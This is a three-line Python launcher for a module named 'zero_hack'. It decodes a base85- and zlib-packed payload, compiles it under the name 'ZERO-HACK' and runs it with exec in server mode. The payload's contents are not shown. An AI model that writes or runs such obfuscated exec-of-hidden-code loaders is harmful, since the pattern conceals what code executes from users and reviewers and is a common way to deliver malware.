import sys, zero_hack
sys.argv.append("--server")
zero_hack.exec(compile(zero_hack.zlib.decompress(zero_hack.base64.b85decode(zero_hack._PAYLOAD.encode())), "<ZERO-HACK>", "exec"), globals(), globals())
